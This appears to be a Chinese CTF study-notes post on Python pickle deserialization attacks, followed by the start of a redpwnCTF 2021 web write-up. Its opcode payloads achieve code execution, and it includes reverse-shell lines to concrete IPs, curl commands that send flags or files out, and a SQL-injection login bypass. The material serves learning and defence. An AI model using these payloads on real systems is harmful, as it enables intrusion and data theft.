'eval')来获取eval()，再执行代码。那么如何手写protocol=0的opcode捏？\n首先引入模块builtins和函数getattr\ncbuiltins getattr 然后需要获取当前的上下文，用globals()\ncbuiltins globals globals是个字典，所以还要获取dict这个对象\ncbuiltins dict 还要执行globals()获取完整上下文\ncbuiltins globals (tR 栈顶元素是builtins.globals，压入一个空元组(t，然后用R执行\n然后用dict.get()方法从globals的字典中拿到键名为builtions的值\ncbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tR. 反序列化后得到builtins对象\u0026lt;module 'builtins' (built-in)\u0026gt;；之后再用getattr从builtins对象中取出eval，也就是再套一层娃\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR. \u0026lt;built-in function eval\u0026gt;现在已经拿到了eval对象，再执行代码\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR(S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39; tR. 成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）\n————用pker\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; 参考：wp1 | Code-Breaking中的两个Python沙箱 | Python 格式化字符串漏洞（Django为例）\n \u0026ndash;\u0026raquo;仅可以引入sys模块\u0026amp;名字中不带.点号   栗子5 - [BalsnCTF 2019] Pyshv1   题目环境-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1\n审计一下源码，先看一下肯定会不secure的securePickle.oy\n重写find_class()，被调用时可以灵活添加白名单；再看看server.py\n将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块\n但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃sys.modules['sys']=sys.modules。那么如果我们先从sys中引入modules: import modules from sys，然后将modules['sys']改为modules['os']就将成功引入os模块。\n但有个缺陷是modules为dict，需要用getattr(sys.modules[module], name)进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改\npker\nmodules=GLOBAL('sys', 'modules') modules['sys']=modules modules_get=GLOBAL('sys', 'get') os=modules_get('os') modules['sys']=os system=GLOBAL('sys', 'system') system('dir') return opcode:\nb\u0026quot;csys\\nmodules\\np0\\n0g0\\nS'sys'\\ng0\\nscsys\\nget\\np2\\n0g2\\n(S'os'\\ntRp3\\n0g0\\nS'sys'\\ng3\\nscsys\\nsystem\\np5\\n0g5\\n(S'dir'\\ntR.\u0026quot;  \u0026ndash;\u0026raquo;仅可以引入题目中自设空模块   栗子6 - [BalsnCTF 2019] Pyshv2   题目环境-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2\nfind_class()稍有区别，在getattr()之前先用了__import__()\n这次的白名单是structs，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。\n__builtins__是所有模块公有的字典，记录所有的内建函数，可以通过对__builtins__内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。\n我们知道，__getattribute__魔术方法可以访问任意属性。而同时__import__并不是铁板一块，它的全部参数是__import__(name, globals=None, locals=None, fromlist=(), level=0)，它可以被替换（通过导入builtins模块并赋值给builtins.__import__）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了__import__，现在我们可以劫持这个__import__，让它变为__getattribute__，让我们引入的structs变为structs.__getattribute__(structs).xxx。\n对于引入模块的检查只会出现在b\u0026rsquo;c\u0026rsquo;时，所以我们在用S操作码劫持__import__时并不会引发find_class()的过滤。\n然而我们不能直接getattr()=getattr()这样覆盖__import__，我们还需要__dict__的帮忙。__dict__是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。\n所以整合一下上面的思路：我们先要引入助手liststructs.__dict__，取出structs空模块的内建函数（一个待取的dict）structs.__builtins__和我们需要的魔术方法structs.__getattribute__。之后从内建函数structs.__builtins__中将键名为__import__的值替换为structs.__getattribute__，然后借助__dict__将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b\u0026rsquo;c\u0026rsquo;从structs中引入get时触发find_class()中的__import__，也就相当于在执行structs.__getattribute__('structs').get，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数__builtins__，所以利用这个得到的get方法就可以从__builtins__中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。\npker\n__dict__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__dict__\u0026#39;) __builtins__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__builtins__\u0026#39;) gtat = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__getattribute__\u0026#39;) __builtins__[\u0026#39;__import__\u0026#39;] = gtat __dict__[\u0026#39;structs\u0026#39;] = __builtins__ builtin_get = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;get\u0026#39;) eval = builtin_get(\u0026#39;eval\u0026#39;) eval(\u0026#39;pickle.sys.modules[\u0026#39;os\u0026#39;].system(\u0026#39;cat ../flag.txt\u0026#39;)\u0026#39;) return opcode\nb\u0026quot;cstructs\\n__dict__\\np0\\n0cstructs\\n__builtins__\\np1\\n0cstructs\\n__getattribute__\\np2\\n0g1\\nS'__import__'\\ng2\\nsg0\\nS'structs'\\ng1\\nscstructs\\nget\\np5\\n0g5\\n(S'eval'\\ntRp6\\n0g6\\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\\ntR.\u0026quot;  禁止b'R'操作码 也就相当于不可以用__reduce__，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用b'i'，b'i'，b'b'这些操作码来rce。\n\u0026ndash;\u0026raquo;变量覆盖   栗子7 - [高校战“疫”网络安全分享赛2020] webtmp   （这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了R操作码，同时重写find_class()限制引入模块为__main__，两个考点）\nimport base64 import io import sys import pickle from flask import Flask, Response, render_template, request import secret app = Flask(__name__) class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == \u0026#39;__main__\u0026#39;: return getattr(sys.modules[\u0026#39;__main__\u0026#39;], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.args.get(\u0026#39;source\u0026#39;): return Response(read(__file__), mimetype=\u0026#39;text/plain\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: try: pickle_data = request.form.get(\u0026#39;data\u0026#39;) if b\u0026#39;R\u0026#39; in base64.b64decode(pickle_data): return \u0026#39;No... I don\\\u0026#39;t like R-things. No Rabits, Rats, Roosters or RCEs.\u0026#39; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return \u0026#39;Are you sure that is an animal???\u0026#39; correct = (result == Animal(secret.name, secret.category)) return render_template(\u0026#39;unpickle_result.html\u0026#39;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \u0026#34;Something wrong\u0026#34; sample_obj = Animal(\u0026#39;一给我哩giaogiao\u0026#39;, \u0026#39;Giao\u0026#39;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(\u0026#39;unpickle_page.html\u0026#39;, sample_obj=sample_obj, pickle_data=pickle_data) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 看源码，opcode部分ban掉了R操作码（调用一个callable对象），不能用__reduce__了；也重写了find_class()，module必须是__main__；我们的目标是\nrestricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)为真，即correct==True\n这里我们通过加载__main__.secret可以引入secret模块，来把secret.name和secret.category这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）\npker\nsecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;frieggs\u0026#39; secret.category = \u0026#39;frieggs\u0026#39; animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;, \u0026#39;frieggs\u0026#39;, \u0026#39;frieggs\u0026#39;) return animal # b\u0026#34;c__main__\\nsecret\\np0\\n0g0\\n(}(S\u0026#39;name\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtbg0\\n(}(S\u0026#39;category\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtb(S\u0026#39;frieggs\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ni__main__\\nAnimal\\np3\\n0g3\\n.\u0026#34; 或者构造的exp.py\nimport pickle class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category print(pickle.dumps(Animal(name=\u0026#34;x\u0026#34;, category=\u0026#34;y\u0026#34;), protocol=3)) # b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; ————所以在不允许b'R'的情况下，思路则是篡改secret中的name和categoriy，单纯的用b'c'引入模块对Animal进行实例化，这一过程也相当于是执行了函数\n 一种解决办法就是这个栗子中的，干脆就不rce，而是用b'c'变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。\n\u0026ndash;\u0026raquo;使用__setstate__\u0026amp;b'b'实现rce 另一种方式是用BUILD指令b'b'及进行rce。\n在pickle源码中BUILD指令是这样的\n如果一个实例inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则直接把state这个dist的内容合并到inst.__dict__ 内。\n如果一个类原本没有__setstate__这个方法，当我们用{'__setstate__': os.system}来BUILD这个对象，那么现在对象的__setstate__就变成了os.system；接下来利用\u0026quot;ls /\u0026quot;来再次BUILD这个对象，则会执行setstate(\u0026quot;ls /\u0026quot;) ，而此时__setstate__已经被我们设置为os.system，因此实现了rce\nimport pickle import os class Student(): def __init__(self): self.name = \u0026#39;amelia\u0026#39; self.grade = \u0026#39;A1\u0026#39; payload = b\u0026#39;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.\u0026#39; # shell = b\u0026#34;\u0026#34;\u0026#34;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubS\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;\\nb.\u0026#34;\u0026#34;\u0026#34; pickle.loads(payload) 可以看到成功做到了rce~~反弹shell当然也可以\n\u0026ndash;\u0026raquo;使用_instantiate()\u0026amp;load_obj()\u0026amp;load_inst()\u0026amp;b'o'\u0026amp;b'i'实现rce   _instantiate(): Create a new object via klass(*args); Leads to arbitrary function call actually\n  def _instantiate(self, klass, args): if (args or not isinstance(klass, type) or hasattr(klass, \u0026#34;__getinitargs__\u0026#34;)): try: # Arbitrary function all value = klass(*args) except TypeError as err: raise TypeError(\u0026#34;in constructor for %s: %s\u0026#34; % (klass.__name__, str(err)), sys.exc_info()[2]) else: value = klass.__new__(klass) self.append(value)     load_obj()\n  def load_obj(self): # Stack is ... markobject classobject arg1 arg2 ... args = self.pop_mark() cls = args.pop(0) self._instantiate(cls, args) dispatch[OBJ[0]] = load_obj     load_inst()\n  def load_inst(self): # read from user input module = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) name = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) klass = self.find_class(module, name) # get args from stack args = self.pop_mark() self._instantiate(klass, args) dispatch[INST[0]] = load_inst     exp.py\nimport pickle import struct import base64 def exploit(command): assert type(command) is list payload_prefix = b\u0026#39;\u0026#39;\u0026#39;((\u0026#39;\u0026#39;\u0026#39; payload_suffix = b\u0026#39;\u0026#39;\u0026#39;lisubprocess\\nPopen\\n.\u0026#39;\u0026#39;\u0026#39; payload_body = bytes() for c in command: payload_body += b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(c))) + bytes(c, encoding=\u0026#34;utf-8\u0026#34;) payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;print(\u0026#39;pwned!\u0026#39;)\u0026#34; ]) print(\u0026#34;Payload:\u0026#34;, payload) print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) x = pickle.loads(payload) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main() # 反弹shell当然也可 都说了是rce了 import sys,socket,os,pty s=socket.socket() s.connect((\u0026#34;182.92.191.192\u0026#34;,50000)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(\u0026#34;/bin/sh\u0026#34;) payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((\u0026#34;8.8.8.8\u0026#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39;, ])   栗子8 - [巅峰极客 2021]opcode   首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码\n第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的session['data']处\n但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写pickle.loads方法，只是个摆设，相当于仅对R操作码进行了限制，笑嘻了\n直接上eval()+b'o'来弹shell了，不多bb\n(cbuiltins eval S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\\\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.113.107/8426 0\u0026amp;1\u0026#34;\\\u0026#39;)\u0026#39; o. 或者是用system()+curl+b'o'外带flag\n(cos system S\u0026#39;curl burp_collaborator.net/?flag=`app/readflag`\u0026#39; o. 然后生成b64的内容（用'''的好处是不用考虑太多引号转义的问题\nimport base64 data = b\u0026#39;\u0026#39;\u0026#39;xxxxxxxxxxxxxx\u0026#39;\u0026#39;\u0026#39; print(base64.b64encode(data)) cookie的生成就是flask_session_cookie_manager一把梭了\n$ python3 flask_session_cookie_manager3.py encode -s \u0026#39;y0u-wi11_neuer_kn0vv-!@#se%32\u0026#39; -t \u0026#39;{\u0026#34;data\u0026#34;: \u0026#34;xxxxb64_contentxxxx\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;adminadmin\u0026#34;}\u0026#39; ————如果按照题目原有的意思，限制builtins+b'R'操作码也是很好做出来的\n先用pker生成带R的opcode\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; 然后手搓，在调用callable前添加MARK即(，去掉t和调用t用到的MARK\n也就是[callable] [tuple] R===\u0026gt;MARK [callable] [args...] o\nb'''cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0(g0\\ng1\\nS'get'\\nop2\\n0cbuiltins\\nglobals\\np3\\n0(g3\\nop4\\n0(g2\\ng4\\nS'__builtins__'\\nop5\\n0(g0\\ng5\\nS'eval'\\nop6\\n0(g6\\nS'__import__(\u0026quot;os\u0026quot;).system(\u0026quot;whoami\u0026quot;)'\\no.''' 可以看下区别\n修改都是一对一对的，总结一下方法就是0gx要变为0(gx，(gx要变为gx ，tR换成o\n参考：wp\n \u0026ndash;\u0026raquo;使用_getattribute()\u0026amp;load_obj()\u0026amp;load_inst()实现任意文件读取   find_class()\n  def find_class(self, module, name): # Subclasses may override this. sys.audit(\u0026#39;pickle.find_class\u0026#39;, module, name) if self.proto \u0026lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] __import__(module, level=0) if self.proto \u0026gt;= 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name)     _getattribute()\n  def _getattribute(obj, name): for subpath in name.split(\u0026#39;.\u0026#39;): if subpath == \u0026#39;\u0026lt;locals\u0026gt;\u0026#39;: raise AttributeError(\u0026#34;Can\u0026#39;t get local attribute {!r}on {!r}\u0026#34; .format(name, obj)) try: parent = obj obj = getattr(obj, subpath) except AttributeError: raise AttributeError(\u0026#34;Can\u0026#39;t get attribute {!r}on {!r}\u0026#34; .format(name, obj)) from None return obj, parent     read()\n  def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read()     仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值\nexp.py\nimport pickle import struct import base64 def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() def exploit(filename): payload_prefix = b\u0026#39;\u0026#39;\u0026#39;(\u0026#39;\u0026#39;\u0026#39; payload_body = b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(filename))) + bytes(filename, encoding=\u0026#34;utf-8\u0026#34;) payload_suffix = b\u0026#39;\u0026#39;\u0026#39;i__main__\\nread\\n.\u0026#39;\u0026#39;\u0026#39; payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit(\u0026#34;flag\u0026#34;) print(\u0026#34;Payload:\u0026#34;, payload) # b\u0026#39;(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\n.\u0026#39; print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) if __name__ == \u0026#34;__main__\u0026#34;: main() 再把这一部分的payload缝合到创建Animal实例的Opcode中去\n# 原: name=\u0026#39;x\u0026#39;,category=\u0026#39;y\u0026#39; b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; # 缝合 应该能看出来改在哪里了 b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03(X\\x04\\x00\\x00\\x00flagi__main__\\nread\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; 一些小技巧\u0026amp;注意事项  当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A 对payload进行b64加密时，注意别把\\n给单独编码了（不过正常都不会） 其他模块的load也可以触发pickle反序列化漏洞  例如：numpy.load()先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；pandas.read_pickle()直接使用pickle.load()方法\n 灵活运用burp collaborator  虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：curl 的用法指南\n# 基操1 os.system(\u0026#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`) # 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST os.system(\u0026#39;curl -d \u0026#39;@/flag.txt\u0026#39; http://xxxx.burpcollaborator.net/) 最后，出于安全角度的考量   禁用pickle，使用Json或Google Protocol Buffers\n  当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写find_class()（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名\n  举一个hmac的栗子\nimport hmac import pickle import base64 class Student: def __init__(self, name, age): self.name = name self.age = age def __str__(self): return \u0026#34;My name is %s, I am %dyears old.\u0026#34; % ( self.name, self.age ) class HMAC_Pickler: def __init__(self, secret_key, seperator=\u0026#34;|\u0026#34;): self.secret_key = secret_key self.seperator = seperator def digital_signature(self, data): signer = hmac.new(self.secret_key) signer.update(data) return signer.hexdigest() def loads(self, data): sign = data[:32] p = data[32+len(self.seperator):] assert sign == self.digital_signature(p), (\u0026#34;Data is tampered by someone.\u0026#34;) return pickle.loads(p) def dumps(self, obj): p = pickle.dumps(obj) sign = self.digital_signature(p) return \u0026#34;%s%s%s\u0026#34; % (sign, self.seperator, p) def main(): SECRET_KEY = b\u0026#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f\u0026#39; pickler = HMAC_Pickler(SECRET_KEY) obj = Student(\u0026#34;Jack\u0026#34;, 19) print(obj) p = pickler.dumps(obj) print(p) o = pickler.loads(p) print(o) p += \u0026#34;I am hacker, trying evil things\u0026#34; x = pickler.loads(p) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main()     栗子9 - [BalsnCTF 2019] Pyshv3   这次的find_class()没有变化，但是structs有具体的实现\n同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回\n而这个self.user.privileged在一开始就被设为了False\nemmmm 这怎么绕过捏？\n先说非预期，将__builtins__复制到modules属性上；再说说预期解。\n我们知道，有__get__，__set__这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，a.x的查找顺序是a.__dict__['x']，之后type(a).__dict__['x']，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：什么是描述符（descriptor））\n我们利用描述器的特性，将User类的__set__方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发__set__，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。\npker\nUser = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) User.__set__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;User\u0026#39;) user = User(0, 0) User.privileged = user return user opcode\nb\u0026quot;cstructs\\nUser\\np0\\n0g0\\n(}(S'__set__'\\ncstructs\\nUser\\ndtbg0\\n(I0\\nI0\\ntRp2\\n0g0\\n(}(S'privileged'\\ng2\\ndtbg2\\n.\u0026quot;  考虑到这个题更综合了python的相关特性，所以把这个题放在最后。\n 从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。\n自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT\n 最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~\nPython 反序列化漏洞学习笔记 | 一篇文章带你理解漏洞之 Python 反序列化漏洞 | pickle反序列化初探 | Python pickle 反序列化实例分析 | Python 反序列化安全问题（一） - Python 反序列化安全问题（二） | 从零开始python反序列化攻击：pickle原理解析 \u0026amp; 不用reduce的RCE姿势 | 关于Python sec的一些简单的总结 | Sour Pickles A serialised exploitation guide in one part - Macro Slaviero | 🐍 Security Issues in Python Pickle\n","date":"2021-08-12T11:48:05+08:00","permalink":"https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/","section":"posts","tags":["python","unserialize"],"title":"反序列化专题笔记·壹·python篇"},{"categories":["CTF"],"contents":"官方的docker地址~~复现一本满足~https://github.com/redpwn/redpwnctf-2021-challenges\nweb/inspect-me  See if you can find the flag in the source code!\ninspect-me.mc.ax\n web/orm-bad  I just learned about orms today! They seem kinda difficult to implement though\u0026hellip; Guess I\u0026rsquo;ll stick to good old raw sql statements!\norm-bad.mc.ax\nDownloads - app.js\n 万能密码：admin\u0026rsquo;or'1 : admin\n关于orm 之后要补一下知识：Object–relational mapping ORM 实例教程\nweb/secure  Just learned about encryption—now, my website is unhackable!\nsecure.mc.ax\nDownloads - index.js\n 还是个登录框，尝试万能密码\n源码是这样的\nconst crypto = require(\u0026#39;crypto\u0026#39;); const express = require(\u0026#39;express\u0026#39;); const db = require(\u0026#39;better-sqlite3\u0026#39;)(\u0026#39;db.sqlite3\u0026#39;); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT );`); db.exec(`INSERT INTO users (username, password) VALUES ( \u0026#39;${btoa(\u0026#39;admin\u0026#39;)}\u0026#39;, \u0026#39;${btoa(crypto.randomUUID)}\u0026#39; )`); const app = express(); app.use( require(\u0026#39;body-parser\u0026#39;).urlencoded({ extended: false, }) ); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (!req.body.username || !req.body.password) return res.redirect(\u0026#39;/?message=Username and password required!\u0026#39;); const query = `SELECT id FROM users WHERE username = \u0026#39;${req.body.username}\u0026#39; AND password = \u0026#39;${req.body.password}\u0026#39;;`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error(\u0026#39;Incorrect login\u0026#39;); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } }); 他这个b64加密是发生在前端的，也就是在发包的时候就已经对post的数据进行了预处理，而具体到后端进行sql语句的查询时会直接拼接req.body.username/passwd的数据，不会进行进一步的检查或过滤\n刚开始想复杂了\nweb/cool  Aaron has a message for the cool kids. For support, DM BrownieInMotion.\ncool.mc.ax\nDownloads - app.py\n 登录框，可以注册 先尝试test: test 登录成功但是无法获取信息（注册后也会跳转这个页面\n留意cookie部分，是熟悉的flask session，扔进工具里解密\n再参考源码中的/message部分，考虑将session设为{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;ginkoid\u0026rdquo;}后登入查看信息（开始以为是session伪造 